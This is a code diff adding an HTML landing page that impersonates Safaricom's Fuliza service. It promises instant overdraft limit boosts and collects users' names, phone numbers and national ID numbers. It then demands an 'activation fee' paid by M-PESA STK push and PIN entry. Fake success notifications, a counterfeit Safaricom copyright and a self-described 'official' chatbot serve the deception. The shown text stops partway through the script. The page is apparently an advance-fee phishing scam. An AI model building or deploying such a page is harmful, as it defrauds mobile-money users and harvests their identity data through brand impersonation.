@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Safaricom Fuliza Portal | Official Partner Services</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            safaricom: {
+              DEFAULT: '#00A859',
+              dark: '#008544',
+              light: '#E6F6EC',
+              accent: '#70C041',
+              red: '#E11D48'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    .chat-scroll::-webkit-scrollbar { width: 4px; }
+    .chat-scroll::-webkit-scrollbar-thumb { background: #CBD5E1; border-radius: 4px; }
+    
+    @keyframes toastIn {
+      from { opacity: 0; transform: translateY(-20px) scale(0.9); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes toastOut {
+      from { opacity: 1; transform: translateY(0) scale(1); }
+      to { opacity: 0; transform: translateY(-20px) scale(0.9); }
+    }
+    .toast-enter { animation: toastIn 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    .toast-exit { animation: toastOut 0.3s ease-in forwards; }
+  </style>
+</head>
+<body class="bg-gray-50 text-gray-900 flex flex-col min-h-screen relative overflow-x-hidden">
+
+  <!-- Header Nav -->
+  <header class="bg-white shadow-sm border-b border-gray-100 sticky top-0 z-40">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+      <a href="#" class="flex items-center space-x-3">
+        <div class="flex items-center space-x-3">
+          <div class="relative w-12 h-12 bg-safaricom rounded-full flex items-center justify-center shadow-inner overflow-hidden border-2 border-safaricom-red">
+             <div class="w-8 h-8 rounded-full border-4 border-white flex items-center justify-center">
+               <div class="w-3 h-3 bg-safaricom-red rounded-full"></div>
+             </div>
+          </div>
+          <div class="flex flex-col">
+            <span class="font-black text-2xl text-gray-900 tracking-tight leading-none">Safaricom</span>
+            <div class="flex items-center space-x-1 mt-1">
+              <span class="text-[10px] bg-safaricom text-white px-1.5 py-0.2 rounded font-bold uppercase tracking-widest">Fuliza</span>
+              <span class="text-[11px] text-safaricom-red font-bold italic tracking-wide">Twaweza</span>
+            </div>
+          </div>
+        </div>
+      </a>
+
+      <nav class="hidden md:flex items-center space-x-8 text-sm font-semibold text-gray-700">
+        <a href="#verify" class="hover:text-safaricom transition-colors">Boost Limit</a>
+        <a href="#services" class="hover:text-safaricom transition-colors">Services</a>
+        <a href="#faq" class="hover:text-safaricom transition-colors">FAQs</a>
+        <a href="#support" class="hover:text-safaricom transition-colors">Support Desk</a>
+        <a href="#verify" class="bg-safaricom hover:bg-safaricom-dark text-white px-5 py-2.5 rounded-xl font-bold transition-all shadow-md shadow-safaricom/20">
+          Check Eligibility
+        </a>
+      </nav>
+
+      <button id="menu-btn" class="md:hidden p-2 rounded-lg text-gray-600 hover:bg-gray-100">
+        <i data-lucide="menu" class="w-6 h-6"></i>
+      </button>
+    </div>
+
+    <div id="mobile-menu" class="hidden md:hidden border-t border-gray-100 bg-white px-4 pt-2 pb-4 space-y-2">
+      <a href="#verify" class="block py-2 text-gray-700 hover:text-safaricom font-medium">Boost Limit</a>
+      <a href="#services" class="block py-2 text-gray-700 hover:text-safaricom font-medium">Services</a>
+      <a href="#faq" class="block py-2 text-gray-700 hover:text-safaricom font-medium">FAQs</a>
+      <a href="#support" class="block py-2 text-gray-700 hover:text-safaricom font-medium">Support Desk</a>
+      <a href="#verify" class="block w-full text-center bg-safaricom text-white py-2.5 rounded-xl font-bold">
+        Check Account
+      </a>
+    </div>
+  </header>
+
+  <!-- Floating Toast Queue Top Right -->
+  <div id="notification-toast-container" class="fixed top-24 right-6 z-50 pointer-events-none flex flex-col space-y-2 max-w-sm w-full"></div>
+
+  <!-- Main Section -->
+  <main class="flex-grow">
+    
+    <!-- Hero / Form Section -->
+    <section id="verify" class="py-10 md:py-16 bg-gradient-to-b from-safaricom-light/40 via-white to-gray-50">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <!-- Step 1: Account Verification Form -->
+        <div id="step-1" class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+          <div class="lg:col-span-6 space-y-6 text-center lg:text-left">
+            <div class="inline-flex items-center space-x-2 bg-safaricom-light text-safaricom font-bold text-xs px-3.5 py-1.5 rounded-full border border-safaricom/20">
+              <i data-lucide="shield-check" class="w-4 h-4"></i>
+              <span>Official M-PESA Automated Portal</span>
+            </div>
+            <h1 class="text-3xl sm:text-4xl lg:text-5xl font-black text-gray-900 tracking-tight leading-tight">
+              Upgrade Your <span class="text-safaricom">Fuliza Limit</span> Instantly
+            </h1>
+            <p class="text-gray-600 text-base md:text-lg leading-relaxed">
+              Automated scoring evaluates your M-PESA statement patterns in real-time to adjust and unlock increased overdraft limits instantly.
+            </p>
+            
+            <div class="relative rounded-2xl overflow-hidden shadow-xl border border-gray-100 my-4">
+              <img src="https://images.unsplash.com/photo-1556742049-0a67e6b0f027?auto=format&fit=crop&w=1000&q=80" alt="Safaricom Digital Payments" class="w-full h-48 object-cover object-center">
+              <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex items-end p-4">
+                <p class="text-white font-extrabold text-sm tracking-wide">
+                  <span class="text-safaricom-accent">TWAWEZA:</span> Empowering your financial freedom everywhere, every day.
+                </p>
+              </div>
+            </div>
+
+            <div class="pt-2 grid grid-cols-2 sm:grid-cols-3 gap-4 border-t border-gray-200/60 text-left">
+              <div>
+                <span class="block text-xl font-black text-gray-900">100%</span>
+                <span class="text-xs text-gray-500 font-medium">Automated Process</span>
+              </div>
+              <div>
+                <span class="block text-xl font-black text-gray-900">24/7</span>
+                <span class="text-xs text-gray-500 font-medium">Instant Disbursement</span>
+              </div>
+              <div>
+                <span class="block text-xl font-black text-gray-900">Strictly</span>
+                <span class="text-xs text-gray-500 font-medium">Encrypted Data</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="lg:col-span-6">
+            <div class="bg-white rounded-3xl shadow-2xl border border-gray-100 p-6 sm:p-8 relative">
+              <div class="mb-6 flex items-center justify-between">
+                <div>
+                  <h2 class="text-xl font-extrabold text-gray-900">Account Verification</h2>
+                  <p class="text-xs text-gray-500">Provide official details registered to your Safaricom line.</p>
+                </div>
+                <div class="bg-safaricom-light p-2.5 rounded-2xl text-safaricom">
+                  <i data-lucide="smartphone" class="w-6 h-6"></i>
+                </div>
+              </div>
+
+              <form id="fuliza-form" onsubmit="handleInitialSubmit(event)" class="space-y-4">
+                <div>
+                  <label class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">Full Name (As on ID)</label>
+                  <div class="relative">
+                    <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
+                      <i data-lucide="user" class="w-5 h-5"></i>
+                    </span>
+                    <input type="text" id="user-name" required placeholder="e.g. Jane Wanjiku" minlength="2" class="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-safaricom focus:border-safaricom outline-none transition text-sm font-medium">
+                  </div>
+                </div>
+
+                <div>
+                  <label class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">Safaricom Mobile Number</label>
+                  <div class="relative">
+                    <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
+                      <i data-lucide="phone" class="w-5 h-5"></i>
+                    </span>
+                    <input type="tel" id="user-phone" required placeholder="0712345678" pattern="^(07|01|2547|2541)[0-9]{8}$" class="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-safaricom focus:border-safaricom outline-none transition text-sm font-medium">
+                  </div>
+                </div>
+
+                <div>
+                  <label class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">National ID Number</label>
+                  <div class="relative">
+                    <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
+                      <i data-lucide="credit-card" class="w-5 h-5"></i>
+                    </span>
+                    <input type="text" id="user-id" required placeholder="12345678" pattern="^[0-9]{7,9}$" class="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-safaricom focus:border-safaricom outline-none transition text-sm font-medium">
+                  </div>
+                </div>
+
+                <div>
+                  <label class="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-1.5">Current Fuliza Limit (Ksh)</label>
+                  <div class="relative">
+                    <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
+                      <i data-lucide="wallet" class="w-5 h-5"></i>
+                    </span>
+                    <input type="number" id="user-limit" required placeholder="e.g. 500" min="0" step="1" class="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-safaricom focus:border-safaricom outline-none transition text-sm font-medium">
+                  </div>
+                </div>
+
+                <button type="submit" class="w-full bg-safaricom hover:bg-safaricom-dark text-white font-extrabold py-3.5 rounded-xl shadow-lg hover:shadow-xl transition flex items-center justify-center space-x-2 mt-6">
+                  <span>Verify Account & Continue</span>
+                  <i data-lucide="arrow-right" class="w-5 h-5"></i>
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+
+        <!-- Loader 1 (Line History Analysis - 6 Seconds) -->
+        <div id="loader-1" class="hidden text-center py-16 max-w-md mx-auto">
+          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
+            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
+              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
+              <i data-lucide="cpu" class="w-8 h-8 text-safaricom"></i>
+            </div>
+            <div>
+              <h3 class="text-xl font-bold text-gray-900">Zuri Scoring Analysis</h3>
+              <p class="text-xs text-safaricom font-bold mt-1" id="loader-1-text">Cross-referencing M-PESA line history...</p>
+            </div>
+            <p class="text-xs text-gray-500">Evaluating transaction velocity, repayment history, and account longevity to establish eligibility.</p>
+          </div>
+        </div>
+
+        <!-- Step 2: Target Limit Selection -->
+        <div id="step-2" class="hidden max-w-4xl mx-auto space-y-8">
+          <div class="bg-white rounded-2xl p-6 shadow-md border-l-4 border-safaricom flex flex-wrap justify-between items-center gap-4">
+            <div class="space-y-1">
+              <span class="text-xs font-bold text-safaricom uppercase tracking-wider">Verified Subscriber</span>
+              <h3 id="profile-name" class="text-lg font-extrabold text-gray-900">---</h3>
+              <p class="text-xs text-gray-500">ID Number: <span id="profile-id" class="font-mono text-gray-700">---</span></p>
+            </div>
+            <div class="bg-safaricom-light px-5 py-3 rounded-2xl text-right">
+              <span class="text-xs text-gray-600 block font-medium">Current Limit</span>
+              <span id="profile-limit" class="font-black text-safaricom text-lg">Ksh 0</span>
+            </div>
+          </div>
+
+          <div class="text-center space-y-2">
+            <h2 id="dynamic-greeting" class="text-2xl font-extrabold text-gray-900">Good Day</h2>
+            <p class="text-gray-600 text-sm max-w-lg mx-auto">
+              Select your desired limit upgrade tier below to initiate account configuration.
+            </p>
+          </div>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div onclick="selectTier(this, 8000, 267)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 8,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 267</p>
+                </div>
+              </div>
+            </div>
+
+            <div onclick="selectTier(this, 15000, 480)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 15,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 480</p>
+                </div>
+              </div>
+            </div>
+
+            <div onclick="selectTier(this, 30000, 890)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 30,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 890</p>
+                </div>
+              </div>
+            </div>
+
+            <div onclick="selectTier(this, 50000, 1420)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 50,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 1,420</p>
+                </div>
+              </div>
+            </div>
+
+            <div onclick="selectTier(this, 100000, 2150)" class="tier-card p-5 bg-white rounded-2xl border-2 border-gray-100 cursor-pointer hover:border-safaricom transition shadow-sm">
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase">Target Limit</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 100,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 2,150</p>
+                </div>
+              </div>
+            </div>
+
+            <div onclick="selectTier(this, 400000, 3233)" class="tier-card p-5 bg-gradient-to-r from-safaricom-light/60 to-white rounded-2xl border-2 border-safaricom/40 cursor-pointer hover:border-safaricom transition shadow-sm relative">
+              <span class="absolute -top-3 right-4 bg-safaricom text-white text-[10px] font-black uppercase tracking-wider px-2.5 py-0.5 rounded-full">Executive Tier</span>
+              <div class="flex justify-between items-center">
+                <div>
+                  <span class="text-xs font-bold text-safaricom uppercase">Maximum Upgrade</span>
+                  <p class="text-2xl font-black text-gray-900">Ksh 400,000</p>
+                </div>
+                <div class="text-right">
+                  <span class="text-xs font-bold text-gray-400 uppercase">Activation Fee</span>
+                  <p class="text-lg font-bold text-safaricom">Ksh 3,233</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div id="continue-btn-container" class="hidden text-center pt-4">
+            <button onclick="startSecondAnalysis()" class="bg-safaricom hover:bg-safaricom-dark text-white font-black py-4 px-10 rounded-2xl shadow-xl transition inline-flex items-center space-x-2">
+              <span>Proceed to Account Activation</span>
+              <i data-lucide="arrow-right" class="w-5 h-5"></i>
+            </button>
+          </div>
+        </div>
+
+        <!-- Loader 2 (Processing Allocation - 8 Seconds) -->
+        <div id="loader-2" class="hidden text-center py-16 max-w-md mx-auto">
+          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-6">
+            <div class="relative w-20 h-20 mx-auto flex items-center justify-center">
+              <div class="absolute inset-0 rounded-full border-4 border-safaricom/20 border-t-safaricom animate-spin"></div>
+              <i data-lucide="refresh-cw" class="w-8 h-8 text-safaricom"></i>
+            </div>
+            <div>
+              <h3 class="text-xl font-bold text-gray-900">Processing Allocation</h3>
+              <p class="text-xs text-safaricom font-bold mt-1" id="loader-2-text">Staging tier configuration...</p>
+            </div>
+            <p class="text-xs text-gray-500">Securing server clearance and establishing direct STK payment handshakes.</p>
+          </div>
+        </div>
+
+        <!-- Step 3: Checkout Container -->
+        <div id="step-3" class="hidden max-w-md mx-auto">
+          <div class="bg-white rounded-3xl shadow-2xl border border-gray-100 overflow-hidden">
+            <div class="bg-safaricom text-white p-6 text-center">
+              <i data-lucide="shield-check" class="w-10 h-10 mx-auto mb-2"></i>
+              <h2 class="text-xl font-bold">Limit Allocation Staged</h2>
+              <p class="text-xs text-white/80 mt-1">Settle activation fee via M-PESA to finalize</p>
+            </div>
+
+            <div class="p-6 space-y-4">
+              <div class="space-y-3 divide-y divide-gray-100 text-sm">
+                <div class="flex justify-between pt-1">
+                  <span class="text-gray-500">Account Holder</span>
+                  <span id="summary-name" class="font-bold text-gray-900">---</span>
+                </div>
+                <div class="flex justify-between pt-3">
+                  <span class="text-gray-500">ID Number</span>
+                  <span id="summary-id" class="font-mono font-bold text-gray-900">---</span>
+                </div>
+                <div class="flex justify-between pt-3">
+                  <span class="text-gray-500">Current Limit</span>
+                  <span id="summary-current" class="font-bold text-gray-900">Ksh 0</span>
+                </div>
+                <div class="flex justify-between pt-3">
+                  <span class="text-gray-500">Approved Limit Boost</span>
+                  <span id="summary-target" class="font-extrabold text-safaricom">Ksh 0</span>
+                </div>
+                <div class="flex justify-between pt-3 text-base">
+                  <span class="font-black text-gray-900">Required Activation Fee</span>
+                  <span id="summary-fee" class="font-black text-safaricom">Ksh 0</span>
+                </div>
+              </div>
+
+              <div id="widget-wrapper" class="pt-2"></div>
+              <div id="payment-status-message" class="hidden p-3 rounded-xl text-xs"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Step 4: Success View -->
+        <div id="step-4" class="hidden max-w-md mx-auto text-center py-8">
+          <div class="bg-white p-8 rounded-3xl shadow-2xl border border-gray-100 space-y-4">
+            <div class="w-16 h-16 bg-safaricom-light text-safaricom rounded-full flex items-center justify-center mx-auto">
+              <i data-lucide="check" class="w-10 h-10"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-900">STK Push Triggered!</h2>
+            <p class="text-sm text-gray-600">Please check your handset (<span id="success-phone" class="font-bold"></span>) and enter your M-PESA PIN to complete prompt.</p>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="py-16 bg-white border-t border-gray-100">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center max-w-2xl mx-auto mb-12">
+          <h2 class="text-2xl md:text-3xl font-black text-gray-900">Comprehensive Safaricom Services</h2>
+          <p class="text-gray-500 mt-2 text-sm md:text-base">
+            Twaweza: Bringing convenient overdraft and payment solutions straight to your line.
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+          <div class="p-4 bg-gray-50/70 rounded-2xl border border-gray-100 hover:border-safaricom/30 hover:shadow-md transition">
+            <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?auto=format&fit=crop&w=400&q=80" alt="Restructuring" class="w-full h-32 object-cover rounded-xl mb-4">
+            <h3 class="font-bold text-gray-900 mb-1.5">Limit Restructuring</h3>
+            <p class="text-xs text-gray-500 leading-relaxed">Re-evaluate account credit scoring to adjust base limits dynamically.</p>
+          </div>
+
+          <div class="p-4 bg-gray-50/70 rounded-2xl border border-gray-100 hover:border-safaricom/30 hover:shadow-md transition">
+            <img src="https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?auto=format&fit=crop&w=400&q=80" alt="Instant Activation" class="w-full h-32 object-cover rounded-xl mb-4">
+            <h3 class="font-bold text-gray-900 mb-1.5">Instant Activation</h3>
+            <p class="text-xs text-gray-500 leading-relaxed">Direct automated STK prompt processing for quick account clearance.</p>
+          </div>
+
+          <div class="p-4 bg-gray-50/70 rounded-2xl border border-gray-100 hover:border-safaricom/30 hover:shadow-md transition">
+            <img src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?auto=format&fit=crop&w=400&q=80" alt="Score Monitoring" class="w-full h-32 object-cover rounded-xl mb-4">
+            <h3 class="font-bold text-gray-900 mb-1.5">Score Monitoring</h3>
+            <p class="text-xs text-gray-500 leading-relaxed">Monitor overall line health ratings and overdraft utilization ratios.</p>
+          </div>
+
+          <div class="p-4 bg-gray-50/70 rounded-2xl border border-gray-100 hover:border-safaricom/30 hover:shadow-md transition">
+            <img src="https://images.unsplash.com/photo-1534536281715-e28d76689b4d?auto=format&fit=crop&w=400&q=80" alt="Support" class="w-full h-32 object-cover rounded-xl mb-4">
+            <h3 class="font-bold text-gray-900 mb-1.5">24/7 Zuri Support</h3>
+            <p class="text-xs text-gray-500 leading-relaxed">Instant assistance provided via embedded Zuri conversational agent.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq" class="py-16 bg-gray-50 border-t border-gray-100">
+      <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-center mb-10">
+          <h2 class="text-2xl md:text-3xl font-black text-gray-900">Frequently Asked Questions</h2>
+          <p class="text-gray-500 mt-2 text-sm">Everything you need to know about Fuliza limit extensions.</p>
+        </div>
+
+        <div class="space-y-4">
+          <div class="bg-white rounded-2xl border border-gray-200 overflow-hidden">
+            <button onclick="toggleFaq(1)" class="w-full text-left p-5 flex justify-between items-center font-bold text-gray-900 hover:bg-gray-50">
+              <span>How is my upgraded limit determined?</span>
+              <i id="faq-icon-1" data-lucide="chevron-down" class="w-5 h-5 text-safaricom transition-transform"></i>
+            </button>
+            <div id="faq-ans-1" class="hidden p-5 pt-0 text-xs sm:text-sm text-gray-600 border-t border-gray-100 leading-relaxed">
+              Limit eligibility is generated automatically through analytical scoring of your line longevity, historical M-PESA transaction volume, and past Fuliza repayment records.
+            </div>
+          </div>
+
+          <div class="bg-white rounded-2xl border border-gray-200 overflow-hidden">
+            <button onclick="toggleFaq(2)" class="w-full text-left p-5 flex justify-between items-center font-bold text-gray-900 hover:bg-gray-50">
+              <span>Why is an activation fee required?</span>
+              <i id="faq-icon-2" data-lucide="chevron-down" class="w-5 h-5 text-safaricom transition-transform"></i>
+            </button>
+            <div id="faq-ans-2" class="hidden p-5 pt-0 text-xs sm:text-sm text-gray-600 border-t border-gray-100 leading-relaxed">
+              The activation fee authenticates ownership of the M-PESA account and covers automated credit risk scoring and administrative processing of manual limit overrides.
+            </div>
+          </div>
+
+          <div class="bg-white rounded-2xl border border-gray-200 overflow-hidden">
+            <button onclick="toggleFaq(3)" class="w-full text-left p-5 flex justify-between items-center font-bold text-gray-900 hover:bg-gray-50">
+              <span>How long does it take for my limit to update?</span>
+              <i id="faq-icon-3" data-lucide="chevron-down" class="w-5 h-5 text-safaricom transition-transform"></i>
+            </button>
+            <div id="faq-ans-3" class="hidden p-5 pt-0 text-xs sm:text-sm text-gray-600 border-t border-gray-100 leading-relaxed">
+              Once the STK push payment is confirmed with your M-PESA PIN, limit boosts reflect on your line instantly or within 10 minutes following automated account refresh.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer id="support" class="bg-gray-900 text-gray-300 py-12 border-t border-gray-800">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex flex-col md:flex-row justify-between items-center space-y-6 md:space-y-0">
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="font-black text-white text-lg tracking-wide">Safaricom Fuliza Portal</span>
+            <span class="text-safaricom-red text-xs font-bold italic">Twaweza</span>
+          </div>
+          <p class="text-xs text-gray-500 mt-1">© 2026 Safaricom PLC. All rights reserved. Partner Financial Services.</p>
+        </div>
+
+        <div class="flex space-x-6 text-xs text-gray-400">
+          <a href="#" class="hover:text-white transition">Terms of Service</a>
+          <a href="#" class="hover:text-white transition">Privacy Policy</a>
+          <a href="#" class="hover:text-white transition">Regulatory Compliance</a>
+        </div>
+
+        <a href="https://wa.me/254722000000" target="_blank" class="inline-flex items-center space-x-2 text-xs bg-safaricom hover:bg-safaricom-dark text-white px-4 py-2.5 rounded-xl font-bold transition">
+          <i data-lucide="message-circle" class="w-4 h-4"></i>
+          <span>WhatsApp Support (+254 722 000 000)</span>
+        </a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- FLOATING ASK ZURI CHATBOT WIDGET -->
+  <div class="fixed bottom-6 right-6 z-50">
+    <button id="zuri-toggle-btn" onclick="toggleZuriChat()" class="bg-safaricom hover:bg-safaricom-dark text-white px-5 py-3 rounded-full shadow-2xl transition flex items-center space-x-2 relative border-2 border-white ring-2 ring-safaricom/30 font-bold text-sm">
+      <i data-lucide="message-square" class="w-5 h-5"></i>
+      <span>Ask Zuri</span>
+      <span class="absolute -top-1 -right-1 w-3.5 h-3.5 bg-safaricom-accent rounded-full border-2 border-white"></span>
+    </button>
+
+    <div id="zuri-chat-drawer" class="hidden absolute bottom-16 right-0 w-[340px] sm:w-[390px] h-[520px] bg-white rounded-3xl shadow-2xl border border-gray-200 flex flex-col overflow-hidden">
+      <div class="bg-safaricom p-4 text-white flex justify-between items-center shadow-md">
+        <div class="flex items-center space-x-3">
+          <div class="w-10 h-10 bg-white rounded-full p-0.5 shadow flex-shrink-0 flex items-center justify-center">
+            <svg class="w-full h-full" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="50" cy="50" r="48" fill="#00A859"/>
+              <path d="M25 50 C25 35, 35 25, 50 25 C65 25, 75 35, 75 50 C75 65, 65 75, 50 75" stroke="white" stroke-width="8" stroke-linecap="round"/>
+              <circle cx="50" cy="50" r="10" fill="white"/>
+            </svg>
+          </div>
+          <div>
+            <div class="flex items-center space-x-1.5">
+              <h4 class="font-extrabold text-sm leading-tight">Zuri Assistant</h4>
+              <span class="bg-white/20 text-[9px] font-bold px-1.5 py-0.5 rounded text-white">Official</span>
+            </div>
+            <span class="text-[10px] text-safaricom-light font-medium flex items-center gap-1 mt-0.5">
+              <span class="w-1.5 h-1.5 bg-safaricom-accent rounded-full inline-block animate-ping"></span> Safaricom Verified Agent
+            </span>
+          </div>
+        </div>
+        <button onclick="toggleZuriChat()" class="text-white/80 hover:text-white p-1">
+          <i data-lucide="x" class="w-5 h-5"></i>
+        </button>
+      </div>
+
+      <div id="chat-messages" class="flex-grow p-4 space-y-3 overflow-y-auto chat-scroll bg-gray-50/50 text-xs">
+        <div class="flex items-start space-x-2">
+          <div class="w-7 h-7 rounded-full bg-safaricom text-white flex items-center justify-center flex-shrink-0 mt-0.5 shadow-sm p-1">
+            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="50" cy="50" r="48" fill="#00A859"/>
+              <path d="M25 50 C25 35, 35 25, 50 25 C65 25, 75 35, 75 50" stroke="white" stroke-width="10" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="bg-white p-3 rounded-2xl rounded-tl-none border border-gray-100 shadow-sm text-gray-800 leading-relaxed">
+            Jambo! I am <strong>Zuri</strong>, your official Safaricom digital assistant. How can I assist you with your Fuliza limit boost or account security today?
+          </div>
+        </div>
+      </div>
+
+      <div class="p-2 border-t border-gray-100 bg-white flex space-x-1.5 overflow-x-auto text-[10px] chat-scroll">
+        <button onclick="sendQuickReply('Is this a scam?')" class="bg-safaricom-light text-safaricom hover:bg-safaricom hover:text-white font-bold px-2.5 py-1 rounded-full whitespace-nowrap border border-safaricom/20 transition">Is this a scam?</button>
+        <button onclick="sendQuickReply('How fast is disbursement?')" class="bg-gray-100 hover:bg-safaricom-light hover:text-safaricom font-medium px-2.5 py-1 rounded-full whitespace-nowrap border border-gray-200 transition">How fast is disbursement?</button>
+        <button onclick="sendQuickReply('Why is activation fee required?')" class="bg-gray-100 hover:bg-safaricom-light hover:text-safaricom font-medium px-2.5 py-1 rounded-full whitespace-nowrap border border-gray-200 transition">Why activation fee?</button>
+        <button onclick="sendQuickReply('Talk to human agent')" class="bg-gray-100 hover:bg-safaricom-light hover:text-safaricom font-medium px-2.5 py-1 rounded-full whitespace-nowrap border border-gray-200 transition">Talk to human agent</button>
+      </div>
+
+      <div class="p-3 bg-white border-t border-gray-100 flex items-center space-x-2">
+        <input type="text" id="zuri-input" placeholder="Ask Zuri anything..." onkeypress="handleZuriKeyPress(event)" class="w-full text-xs py-2.5 px-3.5 rounded-xl border border-gray-200 focus:ring-2 focus:ring-safaricom outline-none">
+        <button onclick="sendZuriMessage()" class="bg-safaricom hover:bg-safaricom-dark text-white p-2.5 rounded-xl transition flex-shrink-0">
+          <i data-lucide="send" class="w-4 h-4"></i>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    lucide.createIcons();
+
+    const menuBtn = document.getElementById('menu-btn');
+    const mobileMenu = document.getElementById('mobile-menu');
+    menuBtn.addEventListener('click', () => {
+      mobileMenu.classList.toggle('hidden');
+    });
+
+    function toggleFaq(index) {
+      const ans = document.getElementById(`faq-ans-${index}`);
+      const icon = document.getElementById(`faq-icon-${index}`);
+      ans.classList.toggle('hidden');
+      icon.classList.toggle('rotate-180');
+    }
+
+    const notificationQueue = [
+      { name: "0712***941", action: "Limit Boosted to Ksh 15,000", time: "Just now" },
+      { name: "0724***102", action: "Limit Boosted to Ksh 8,000", time: "1 min ago" },
+      { name: "0708***332", action: "Limit Boosted to Ksh 30,000", time: "2 mins ago" }
+    ];
+
+    let notifIdx = 0;
+    function triggerNextNotification() {
+      const container = document.getElementById('notification-toast-container');
+      if (!container) return;
+
+      const item = notificationQueue[notifIdx];
+      notifIdx = (notifIdx + 1) % notificationQueue.length;
+
+      const toast = document.createElement('div');
+      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-3.5 rounded-2xl shadow-xl border border-safaricom/20 flex items-center space-x-3";
+      toast.innerHTML = `
